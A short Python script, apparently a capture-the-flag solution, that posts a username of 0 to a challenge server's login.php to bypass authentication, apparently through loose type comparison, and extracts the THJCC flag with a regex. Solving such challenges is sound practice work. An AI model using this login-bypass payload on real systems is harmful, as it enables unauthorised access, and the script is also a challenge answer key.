import requests
import re

url = "http://chal.thjcc.org:25601"

res = requests.post(f'{url}/login.php', data={
    'username': 0
})

flag = re.findall(r'(THJCC{.+})', res.text)[0]
print("Flag:", flag)